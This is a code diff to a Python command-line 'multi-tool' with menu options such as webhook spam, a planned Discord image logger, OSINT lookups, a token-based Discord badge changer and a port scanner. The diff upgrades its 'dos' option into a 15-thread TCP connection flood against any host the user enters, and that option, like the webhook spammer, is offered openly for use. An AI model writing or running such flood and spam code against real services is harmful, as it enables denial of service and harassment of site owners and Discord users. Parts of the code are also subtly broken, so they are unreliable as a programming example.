@@ -1,16 +1,21 @@
 import base64
 import datetime
 import os
+import secrets
 import socket
+import string
 import subprocess
+import threading
 import time
 import urllib.parse
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from urllib import parse
+from urllib.parse import urlparse
 
 import httpagentparser
 import httpx
+import hwid
 import phonenumbers
 import requests
 from phonenumbers import carrier, geocoder, timezone
@@ -27,7 +32,7 @@ now = datetime.datetime.now().hour  # noqa: DTZ005
 now_full = datetime.datetime.now().strftime("%H:%M")  # noqa: DTZ005
 
 morning = "good morning! what would you like to do."
-afternoon = "good afternoon!! what would you like to do."
+afternoon = "good afternoon! what would you like to do."
 evening = "good evening! what would you like to do."
 
 spacer = "      "
@@ -52,10 +57,12 @@ def start():
     console.print(f"ip: {cleanip}", style="cyan")
     console.print(f"time: {now_full}", style="cyan")
     console.print(
-        f"1 - webhook spam{spacer}11 - discord image logger (in dev)\n2 - dos{spacer}         12 - temp email\n3 - ip lookup{spacer}   13 - metadata tools\n4 - dns lookup\n5 - whois\n6 - ip -> hostname\n7 - email records\n8 - ssl certs\n9 - username lookup\n10 - number lookup\nq - exit              https://discord.gg/j5MKxynwbV",
+        f"1 - webhook spam{spacer}11 - discord image logger (in dev)\n2 - dos{spacer}         12 - temp email\n3 - ip lookup{spacer}   13 - metadata tools\n4 - dns lookup{spacer}  14 - password gen\n5 - whois{spacer}       15 - discord hypesquad changer\n6 - ip -> hostname    16 - show hwid\n7 - email records     17 - base64 decode + encode\n8 - ssl certs{spacer}   18 - url inspector\n9 - username lookup   19 - port scanner\n10 - number lookup\nq - exit              https://discord.gg/j5MKxynwbV",
         style="cyan",
     )
     choice = console.input("[cyan]| [/cyan]").strip()
+    while not choice:
+        choice = console.input("[cyan]| [/cyan]").strip()
 
     if choice == "1":
         webhook_url = console.input("[cyan]webhook url: [/cyan]").strip()
@@ -72,55 +79,69 @@ def start():
         webhookspam()
 
     elif choice == "2":
-        
+        from concurrent.futures import ThreadPoolExecutor
         user_input = console.input("[cyan]ip/url:  [/cyan]").strip()
-        
+
         parse_target = user_input
         if not parse_target.startswith(("http://", "https://")):
             parse_target = "http://" + parse_target
-            
+
         try:
             parsed = urllib.parse.urlparse(parse_target)
             host = parsed.hostname
             port = parsed.port
-            scheme = urllib.parse.urlparse(user_input).scheme if user_input.startswith(("http://", "https://")) else "http"
-            
+            scheme = (
+                urllib.parse.urlparse(user_input).scheme
+                if user_input.startswith(("http://", "https://"))
+                else "http"
+            )
+
             if port is None:
-                if scheme == "https":
-                    port = 443
-                else:
-                    port = 80
-                    
+                port = 443 if scheme == "https" else 80
+
             if not host:
                 raise ValueError("could not parse a valid hostname or ip address.")
-                
+
         except Exception as e:  # noqa: BLE001
             console.print(f"[red]invalid input format: {e}[/red]")
             port = None
 
         if port is not None:
             console.print(f"[yellow]testing connection to {host} on port {port}...[/yellow]")
-            num = 1
-            
-            while True:
-                try:
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                        sock.settimeout(2.0) 
-                        
-                        sock.connect((host, port))
-                        
-                        console.print(f"{num}.  attacking {host}:{port}", style="cyan")
-                        num += 1
-                        
-                except TimeoutError:
-                    console.print("[red]connection timeout[/red]")
-                    continue
-                except ConnectionRefusedError:
-                    console.print(f"[red]connection refused on port {port}.[/red]")
-                    break
-                except Exception as e:  # noqa: BLE001
-                    console.print(f"network error: {e}", style="cyan")
-                    continue
+
+            stop_event = threading.Event()
+            lock = threading.Lock()
+            counter = 1
+
+            workers = 15
+
+            def worker():
+                nonlocal counter
+                while not stop_event.is_set():
+                    try:
+                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                            # sock.settimeout(0.001)
+                            sock.connect((host, port))
+
+                            with lock:
+                                console.print(f"{counter}.  attacking {host}:{port}", style="cyan")
+                                counter += 1
+
+                    except TimeoutError:
+                        console.print("[red]connection timeout[/red]")
+                        continue
+
+                    except ConnectionRefusedError:
+                        console.print(f"[red]connection refused on port {port}.[/red]")
+                        stop_event.set() 
+                        break
+
+                    except Exception as e:  # noqa: BLE001
+                        console.print(f"network error: {e}", style="cyan")
+                        continue
+
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futures = [ex.submit(worker) for _ in range(workers)]
 
 
 
@@ -484,6 +505,249 @@ text:
                 console.print(f"invalid path. {e}", style="cyan")
         exiftools()
         input("\npress enter to exit...")
+
+    elif choice =="14":
+        def password_gen():
+            try:
+                length = int(input("\nlength (default 20): ") or 20)
+            except ValueError:
+                length = 20
+
+            charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
+
+            for i in range(8):
+                pwd = ''.join(secrets.choice(charset) for _ in range(length))
+                print(f"{i+1:02}: {pwd}")
+        
+        password_gen()
+        console.input("\n[cyan]press enter to quit... [/cyan]")
+
+    elif choice =="15":
+        def change_hypesquad_badge(token, badge_id):
+            url = "https://discord.com/api/v9/hypesquad/online"
+            headers = {
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json",
+            }
+            data = {"house": badge_id}
+
+            try:
+                response = requests.post(url, headers=headers, json=data)
+                response.raise_for_status()
+                console.print(f"hypesquad badge changed to id {badge_id}")
+
+            except requests.exceptions.HTTPError as err:
+                console.print(f"error changing hypesquad badge: {err}")
+
+            except Exception as e:  # noqa: BLE001
+                console.print(f"error: {e}")
+
+
+        if __name__ == "__main__":
+            token = console.input("discord account token: ")
+            badge_id = console.input(
+                "hypesquad badge id (1: bravery, 2: brilliance, 3: balance): "
+            )
+
+            while badge_id not in ["1", "2", "3"]:
+                console.print("invalid hypesquad badge id. enter 1, 2, or 3.")
+                console.input("\n[cyan]press enter to quit... [/cyan]")
+            else:  # noqa: PLW0120
+                change_hypesquad_badge(token, badge_id)
+                console.input("\n[cyan]press enter to quit... [/cyan]")
+
+    elif choice == "16":
+        def showhwid():
+            console.print(f"hwid: {hwid.get_hwid()}")
+        showhwid()
+        console.input("\n[cyan]press enter to quit... [/cyan]")
+
+    elif choice == "17":
+        ch = console.input("[cyan]1 - encode    2 - decode? [/cyan]")
+
+        if ch == "1":
+            text = console.input("text: ")
+            enc_text = base64.b64encode(text.encode("utf-8")).decode("utf-8")
+            console.print(f"encoded text:\n{enc_text}", style="cyan")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+
+        elif ch == "2":
+            enc_text = console.input("text (base64): ")
+            dec_text = base64.b64decode(enc_text.encode("utf-8")).decode("utf-8")
+            console.print(f"decoded text:\n{dec_text}", style="cyan")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+
+
+    elif choice == "18":
+        url = console.input("[cyan]url: [/cyan]").strip()
+
+        if not url.startswith(("http://", "https://")):
+            url = "https://" + url
+
+        try:
+            parsed = urlparse(url)  # noqa: F823
+
+            if not parsed.netloc:
+                console.print("[red]invalid url[/red]")
+                return
+
+            with console.status("[cyan]inspecting url...[/cyan]"):
+                response = httpx.get(
+                    url,
+                    follow_redirects=True,
+                    timeout=10,
+                    headers={
+                        "User-Agent": "vane/1.0"
+                    }
+                )
+
+            console.print("\n[bold cyan]url inspector[/bold cyan]\n")
+
+            console.print(f"[cyan]url:[/cyan]          {url}")
+            console.print(f"[cyan]final url:[/cyan]   {response.url}")
+            console.print(
+                f"[cyan]status:[/cyan]       "
+                f"{response.status_code} {response.reason_phrase}"
+            )
+            console.print(
+                f"[cyan]https:[/cyan]        "
+                f"{'Yes' if response.url.scheme == 'https' else 'No'}"
+            )
+            console.print(
+                f"[cyan]content-type:[/cyan] "
+                f"{response.headers.get('content-type', 'Unknown')}"
+            )
+            console.print(
+                f"[cyan]server:[/cyan]       "
+                f"{response.headers.get('server', 'Unknown')}"
+            )
+
+            content_length = response.headers.get("content-length")
+
+            if content_length:
+                console.print(
+                    f"[cyan]size:[/cyan]         {content_length} bytes"
+                )
+            else:
+                console.print(
+                    f"[cyan]size:[/cyan]         {len(response.content)} bytes"
+                )
+
+            console.print(
+                f"[cyan]redirects:[/cyan]    {len(response.history)}"
+            )
+
+            console.print("\n[bold cyan]security headers[/bold cyan]")
+
+            security_headers = {
+                "strict-transport-security": "HSTS",
+                "content-security-policy": "CSP",
+                "x-frame-options": "X-Frame-Options",
+                "x-content-type-options": "X-Content-Type-Options"
+            }
+
+            for header, name in security_headers.items():
+                if header in response.headers:
+                    console.print(f"[green][+] {name}[/green]")
+                else:
+                    console.print(f"[yellow][-] {name}[/yellow]")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+
+        except httpx.RequestError as e:
+            console.print(f"[red]request failed: {e}[/red]")
+
+        except Exception as e:  # noqa: BLE001
+            console.print(f"[red]error: {e}[/red]")
+
+
+    elif choice == "19":
+        import socket
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        from urllib.parse import urlparse
+
+        from rich.progress import Progress
+
+        host = console.input("[cyan]host: [/cyan]").strip()
+
+        if host.startswith(("http://", "https://")):
+            host = urlparse(host).hostname
+
+        if not host:
+            console.print("[red]invalid host[/red]")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+        else:
+            start = 1
+            end = 1024
+            max_workers = 50
+
+            console.print(
+                f"\n[cyan]scanning {host} ({start}-{end})...[/cyan]\n"
+            )
+
+            def scan_port(port):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.3)
+
+                try:
+                    result = sock.connect_ex((host, port))
+
+                    if result == 0:
+                        try:
+                            service = socket.getservbyport(port, "tcp")
+                        except OSError:
+                            service = "unknown"
+
+                        return port, service
+
+                except OSError:
+                    return None
+
+                finally:
+                    sock.close()
+
+                return None
+
+            open_ports = []
+
+            try:
+                with Progress() as progress:
+                    task = progress.add_task(
+                        "[cyan]scanning ports...",
+                        total=end - start + 1
+                    )
+
+                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                        futures = [
+                            executor.submit(scan_port, port)
+                            for port in range(start, end + 1)
+                        ]
+
+                        for future in as_completed(futures):
+                            result = future.result()
+
+                            if result:
+                                port, service = result
+                                open_ports.append((port, service))
+
+                                console.print(
+                                    f"[green][+] {port:<5} open[/green] "
+                                    f"[dim]({service})[/dim]"
+                                )
+
+                            progress.advance(task)
+
+                open_ports.sort()
+
+                console.print(
+                    f"\n[cyan]scanned {end - start + 1} ports | "
+                    f"{len(open_ports)} open[/cyan]"
+                )
+
+            except OSError as e:
+                console.print(f"[red]scanner error: {e}[/red]")
+
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+
 
     else:
         print("quitting")
